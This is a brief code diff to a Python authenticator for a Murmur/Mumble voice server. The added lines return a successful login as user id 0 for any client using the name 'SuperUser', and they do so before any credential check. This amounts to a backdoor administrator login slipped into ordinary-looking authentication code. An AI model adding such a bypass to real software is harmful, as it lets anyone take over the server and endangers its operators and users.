@@ -52,6 +52,8 @@ class Authenticator(Murmur.ServerAuthenticator):
         try:
             print(f"Authenticating: {name}")
 
+            if name == "SuperUser":
+                return 0, name, None
             mumble_access = get_mumble_access_by_username(name)
             if mumble_access is None:
                 print(f"Failed authenticating: {name}")
